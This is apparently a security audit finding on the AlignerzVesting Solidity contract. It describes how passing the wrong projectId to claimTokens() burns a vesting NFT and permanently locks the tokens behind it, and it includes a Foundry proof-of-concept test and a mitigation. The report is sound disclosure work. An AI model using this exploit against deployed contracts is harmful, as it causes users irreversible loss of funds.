# [000988] Attacker will burn valid NFT and permanently lock vested tokens by providing incorrect projectId [High]
  
  
### Summary

Missing NFT-to-project binding validation in `claimTokens()` will cause permanent loss of vested tokens for users as an attacker will provide an incorrect projectId parameter, causing the function to retrieve an empty allocation with zero flows, satisfy the all-flows-claimed condition, and burn the NFT while transferring zero tokens.

### Root cause

In [protocol/src/contracts/vesting/AlignerzVesting.sol:941-975](https://github.com/dualguard/2025-11-alignerz-i-am-zcai/blob/main/protocol/src/contracts/vesting/AlignerzVesting.sol#L941-L975) the `claimTokens()` function accepts a user-supplied projectId parameter and directly indexes into project allocation mappings without verifying that the NFT actually belongs to the specified project. The contract only tracks whether an NFT belongs to bidding or reward projects using a boolean mapping `NFTBelongsToBiddingProject[nftId]` but lacks validation to ensure the NFT corresponds to the correct specific project within that category.

### Internal pre-conditions

1. User needs to own a valid NFT with an actual allocation in some project to set the NFT as claimable
2. The NFT needs to have been minted from a legitimate project allocation to establish ownership

### External pre-conditions

None required.

### Attack path

1. Attacker calls `claimTokens()` with their valid NFT but provides an incorrect projectId parameter
2. The function retrieves an empty `Allocation` struct from the wrong project's mapping at `protocol/src/contracts/vesting/AlignerzVesting.sol#L945-947`, resulting in `nbOfFlows == 0`
3. The for loop at `protocol/src/contracts/vesting/AlignerzVesting.sol#L953-968` processes zero flows, leaving `flowsClaimed == 0`
4. The condition `flowsClaimed == nbOfFlows` at `protocol/src/contracts/vesting/AlignerzVesting.sol#L969` evaluates to true (0 == 0)
5. The function burns the NFT at `protocol/src/contracts/vesting/AlignerzVesting.sol#L970` and transfers zero tokens at `protocol/src/contracts/vesting/AlignerzVesting.sol#L973`

### Impact

The user suffers permanent loss of their vested token allocation. The actual allocation remains stored in the correct project's mapping but becomes permanently inaccessible since the proving NFT has been destroyed. The attacker does not gain anything but causes irreversible loss for the affected user. The funds become trapped in the vesting contract with no recovery mechanism possible.

### POC

```solidity
// SPDX-License-Identifier: MIT
pragma solidity =0.8.29;

import "forge-std/Test.sol";
import {Aligners26} from "../../src/contracts/token/Aligners26.sol";
import {AlignerzNFT} from "../../src/contracts/nft/AlignerzNFT.sol";
import {MockUSD} from "../../src/MockUSD.sol";
import {AlignerzVesting} from "../../src/contracts/vesting/AlignerzVesting.sol";
import {Upgrades} from "openzeppelin-foundry-upgrades/Upgrades.sol";

// PoC for: Missing NFT-to-Project binding allows burning a valid NFT via wrong projectId,
// permanently locking the underlying vested tokens in the vesting contract.
contract MissingProjectBindingPoC is Test {
    AlignerzVesting vesting;
    Aligners26 token;
    AlignerzNFT nft;
    MockUSD usdt;

    address attacker;

    function setUp() public {
        attacker = makeAddr("attacker");

        // Deploy core contracts
        token = new Aligners26("26Aligners", "A26Z");
        usdt = new MockUSD();
        nft = new AlignerzNFT("AlignerzNFT", "AZNFT", "https://nft.alignerz.bid/");

        // Deploy UUPS proxy for vesting and initialize with NFT address
        address payable proxy = payable(Upgrades.deployUUPSProxy(
            "AlignerzVesting.sol",
            abi.encodeCall(AlignerzVesting.initialize, (address(nft)))
        ));
        vesting = AlignerzVesting(proxy);

        // Allow vesting to mint/burn NFTs
        nft.addMinter(proxy);
        vesting.setTreasury(address(0xBEEF));

        // Give the test contract (owner) enough A26Z tokens and approve vesting for allocations
        // Aligners26 mints total supply to deployer (this contract) in the constructor
        token.approve(address(vesting), type(uint256).max);
    }

    function test_PoC_BurnByWrongProjectId_CausesPermanentLock() public {
        uint256 amount = 1_000 ether;
        uint256 vestingPeriod = 30 days;
        uint256 start = block.timestamp + 1; // any start time
        uint256 claimWindow = 7 days;

        // 1) Launch two reward projects (IDs: 0 and 1) that use the same token and stablecoin
        vesting.launchRewardProject(address(token), address(usdt), start, claimWindow); // rewardProjectId = 0
        vesting.launchRewardProject(address(token), address(usdt), start, claimWindow); // rewardProjectId = 1

        // 2) Fund TVS allocation ONLY for project 0 to the attacker
        address[] memory kols = new address[](1);
        kols[0] = attacker;
        uint256[] memory amounts = new uint256[](1);
        amounts[0] = amount;
        vesting.setTVSAllocation(0, amount, vestingPeriod, kols, amounts);

        // 3) Attacker claims the TVS for project 0, minting an NFT with a valid allocation
        vm.prank(attacker);
        vesting.claimRewardTVS(0);

        // Determine the minted NFT id (ERC721A starts at tokenId 1 and increments)
        uint256 nftId = nft.getTotalMinted();
        assertEq(nft.ownerOf(nftId), attacker, "attacker should own freshly minted NFT");

        // Sanity: vesting contract received the full token allocation for project 0
        assertEq(token.balanceOf(address(vesting)), amount, "vesting should hold allocated tokens");

        // 4) EXPLOIT: Attacker calls claimTokens with WRONG projectId (1) for their NFT from project 0
        //    This resolves an empty allocation (nbOfFlows == 0) under rewardProjects[1],
        //    passes the all-flows-claimed check and burns the NFT while transferring 0 tokens.
        vm.prank(attacker);
        vesting.claimTokens(1, nftId); // <-- wrong projectId, but same token so transfer(0) succeeds

        // 5) Validate impact
        // NFT should be burned (no longer exists)
        vm.expectRevert();
        nft.ownerOf(nftId);

        // Tokens remain locked in vesting (no payout happened)
        assertEq(token.balanceOf(attacker), 0, "attacker did not receive any tokens");
        assertEq(token.balanceOf(address(vesting)), amount, "tokens are now permanently locked in vesting");

        // 6) Attacker can no longer claim from the correct project since NFT is gone
        vm.prank(attacker);
        vm.expectRevert();
        vesting.claimTokens(0, nftId);
    }
}
```

### Mitigation

Consider implementing a mapping to track the originating projectId for each NFT and validate this association before performing operations that could burn the NFT. One approach could be to add a `nftToProjectId` mapping that gets populated when NFTs are minted, then validate the relationship in `claimTokens()` and `mergeTVS()` functions before proceeding with allocation lookups. This would prevent users from accidentally providing incorrect project parameters and ensure only valid project-NFT combinations can execute claim operations.

  